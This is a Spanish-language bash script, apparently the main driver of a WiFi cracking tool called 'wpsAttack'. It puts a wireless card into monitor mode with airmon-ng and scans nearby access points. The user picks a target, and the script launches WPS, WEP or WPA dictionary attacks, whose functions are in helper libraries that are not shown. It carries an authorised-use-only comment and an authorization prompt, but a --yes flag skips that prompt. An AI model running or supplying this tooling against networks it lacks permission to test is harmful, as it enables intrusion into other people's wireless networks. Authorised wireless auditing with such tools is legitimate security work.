#!/bin/bash
# wpsAttack - orquestador de auditoría WiFi (WEP/WPA/WPA2/WPS)
# Uso SOLO en redes propias o con autorización expresa y por escrito.
set -u

SELF_DIR=$(cd "$(dirname "$0")" && pwd)
. "$SELF_DIR/lib/common.sh"
. "$SELF_DIR/lib/scan.sh"
. "$SELF_DIR/lib/attacks.sh"

cd "$SELF_DIR" || exit 1

IFACE=""
WORDLIST=""
SCAN_TIME=15
YES_I_HAVE_PERMISSION=0

usage() {
    cat <<USAGE
wpsAttack - orquestador de auditoría WiFi

Uso: sudo $0 -i <interfaz> [-w diccionario.txt] [-t segundos_escaneo] [--yes]

  -i   interfaz inalámbrica (debe soportar modo monitor)
  -w   diccionario para ataques de clave WPA/WPA2
  -t   segundos de escaneo inicial (default 15)
  --yes  omite la confirmación interactiva (úsalo solo en automatización
         donde la autorización ya fue verificada por otro medio)
  -h   esta ayuda
USAGE
}

while [ $# -gt 0 ]; do
    case "$1" in
        -i) IFACE="$2"; shift 2 ;;
        -w) WORDLIST="$2"; shift 2 ;;
        -t) SCAN_TIME="$2"; shift 2 ;;
        --yes) YES_I_HAVE_PERMISSION=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *) log_err "Opción desconocida: $1"; usage; exit 2 ;;
    esac
done

[ -z "$IFACE" ] && { log_err "Falta -i <interfaz>"; usage; exit 2; }

require_root
require_bin airmon-ng airodump-ng aireplay-ng aircrack-ng awk

if [ "$YES_I_HAVE_PERMISSION" -eq 0 ]; then
    confirm_authorization
else
    log_warn "Confirmación interactiva omitida (--yes). Asegúrate de tener autorización."
fi

trap 'restore_interface "$MONIFACE"' EXIT

log_info "Poniendo $IFACE en modo monitor..."
airmon-ng check kill >/dev/null 2>&1
mon_out=$(airmon-ng start "$IFACE" 2>&1)
MONIFACE=$(echo "$mon_out" | grep -oE '[a-zA-Z0-9]+mon' | head -1)
[ -z "$MONIFACE" ] && MONIFACE="$IFACE"
log_ok "Interfaz en modo monitor: $MONIFACE"

results=$(scan_networks "$MONIFACE" "$SCAN_TIME")
if [ -z "$results" ]; then
    log_err "No se encontraron redes. Prueba aumentar -t o revisar la interfaz."
    exit 1
fi

echo
printf "%-4s %-18s %-4s %-10s %-25s %s\n" "#" "BSSID" "CH" "ENC" "ESSID" "PWR"
echo "$results" | while IFS='|' read -r n bssid channel enc essid power; do
    printf "%-4s %-18s %-4s %-10s %-25s %s\n" "$n" "$bssid" "$channel" "$enc" "$essid" "$power"
done
echo

printf "Elige el número de la red objetivo: "
read -r choice
line=$(echo "$results" | awk -F'|' -v n="$choice" '$1==n')
[ -z "$line" ] && { log_err "Selección inválida."; exit 1; }

BSSID=$(echo "$line" | cut -d'|' -f2)
CHANNEL=$(echo "$line" | cut -d'|' -f3)
ENC=$(echo "$line" | cut -d'|' -f4)
ESSID=$(echo "$line" | cut -d'|' -f5)

log_info "Objetivo: $ESSID ($BSSID) canal $CHANNEL cifrado $ENC"
OUTDIR=$(mk_session_dir "$BSSID")
log_info "Guardando resultados en $OUTDIR"

if check_wps "$MONIFACE" "$BSSID" "$CHANNEL"; then
    log_ok "WPS detectado y habilitado en este AP."
    printf "¿Atacar vía WPS? [s/N]: "
    read -r do_wps
    if [ "$do_wps" = "s" ] || [ "$do_wps" = "S" ]; then
        attack_wps "$MONIFACE" "$BSSID" "$CHANNEL" "$OUTDIR"
        exit $?
    fi
fi

case "$ENC" in
    *WEP*)
        attack_wep "$MONIFACE" "$BSSID" "$CHANNEL" "$OUTDIR"
        ;;
    *WPA*)
        attack_wpa "$MONIFACE" "$BSSID" "$CHANNEL" "$OUTDIR" "$WORDLIST"
        ;;
    *)
        log_err "Cifrado no soportado o red abierta: $ENC"
        exit 1
        ;;
esac
